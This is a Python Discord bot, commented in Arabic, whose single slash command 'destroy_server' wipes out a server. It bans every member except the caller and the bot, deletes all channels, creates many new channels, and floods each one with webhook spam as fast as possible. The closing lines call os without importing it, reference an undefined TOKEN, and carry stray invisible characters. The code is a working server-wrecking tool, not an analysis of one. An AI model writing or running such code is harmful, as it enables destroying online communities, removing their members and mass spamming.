import asyncio
import discord
from discord import app_commands
from discord.ext import commands


class MyBot(commands.Bot):

  def __init__(self):
    intents = discord.Intents.default()
    intents.guilds = True
    intents.guild_messages = True
    intents.message_content = True
    intents.members = True  # مهم جداً لحظر الأعضاء وجلبهم
    super().__init__(command_prefix="!", intents=intents)

  async def setup_hook(self):
    await self.tree.sync()
    print("تم مزامنة أوامر السلاش بنجاح.")


bot = MyBot()


@bot.event
async def on_ready():
  print(f"تم تسجيل الدخول بنجاح باسم: {bot.user}")


# دالة إرسال الرسائل عبر الويب هوك بسرعة فائقة
async def send_webhook_spams(
    webhook: discord.Webhook, message: str, count: int
):
  tasks = [webhook.send(content=message) for _ in range(count)]
  await asyncio.gather(*tasks, return_exceptions=True)


# أمر شامل يجمع كل شيء في سلاش واحد
@bot.tree.command(
    name="destroy_server",
    description=(
        "أمر شامل: حظر الأعضاء، حذف الرومات، وإنشاء الرومات والويب هوك والسبام"
        " دفعة واحدة"
    ),
)
@app_commands.describe(
    room_name="اسم الرومات الجديدة التي سيتم إنشاؤها",
    rooms_count="عدد الرومات الجديدة المراد إنشاؤها",
    message_content="محتوى رسالة الويب هوك",
    messages_count="عدد الرسائل في كل روم",
)
async def destroy_server(
    interaction: discord.Interaction,
    room_name: str,
    rooms_count: int,
    message_content: str,
    messages_count: int,
):
  # التأكد أن المستخدم مشرف (Administrator)
  if not interaction.user.guild_permissions.administrator:
    await interaction.response.send_message(
        "يجب أن تكون مشرفاً (Administrator) لاستخدام هذا الأمر.", ephemeral=True
    )
    return

  # الرد بشكل مؤقت فوراً
  await interaction.response.send_message(
      "جاري تنفيذ العملية الشاملة بأقصى سرعة...", ephemeral=True
  )

  guild = interaction.guild

  # 1. تجهيز مهام الحظر للجميع
  async def ban_member(member):
    if member.id == bot.user.id or member.id == interaction.user.id:
      return
    try:
      await guild.ban(member, reason="تدمير السيرفر الشامل")
    except:
      pass

  ban_tasks = [ban_member(member) for member in guild.members]

  # 2. تجهيز مهام حذف الرومات الحالية
  async def delete_channel(channel):
    try:
      await channel.delete()
    except:
      pass

  delete_tasks = [
      delete_channel(channel)
      for channel in guild.channels
      if channel.id != interaction.channel.id
  ]

  # 3. تجهيز مهام إنشاء الرومات الجديدة والويب هوك والسبام
  category = interaction.channel.category

  async def process_single_room(i):
    try:
      name = f"{room_name}-{i}"
      overwrites = {
          guild.default_role: discord.PermissionOverwrite(
              send_messages=True, view_channel=True
          )
      }
      if category:
        channel = await guild.create_text_channel(
            name, category=category, overwrites=overwrites
        )
      else:
        channel = await guild.create_text_channel(name, overwrites=overwrites)

      webhook = await channel.create_webhook(name=f"Spam-{i}")
      await send_webhook_spams(webhook, message_content, messages_count)
    except Exception as e:
      print(f"خطأ في الروم {i}: {e}")

  create_tasks = [process_single_room(i) for i in range(1, rooms_count + 1)]

  # تنفيذ كل المهام السابقة (الحظر + الحذف + الإنشاء والسبام) في نفس اللحظة تماماً وبأقصى سرعة
  await asyncio.gather(
      asyncio.gather(*ban_tasks, return_exceptions=True),
      asyncio.gather(*delete_tasks, return_exceptions=True),
      asyncio.gather(*create_tasks, return_exceptions=True),
      return_exceptions=True,
  )

  # حذف الروم الحالي في النهاية
  try:
    await interaction.channel.delete()
  except:
    pass



‏MASTERGUARD_TOKEN = os.environ.get('MASTERGUARD_TOKEN') or TOKEN
‏bot.run(MASTERGUARD_TOKEN)


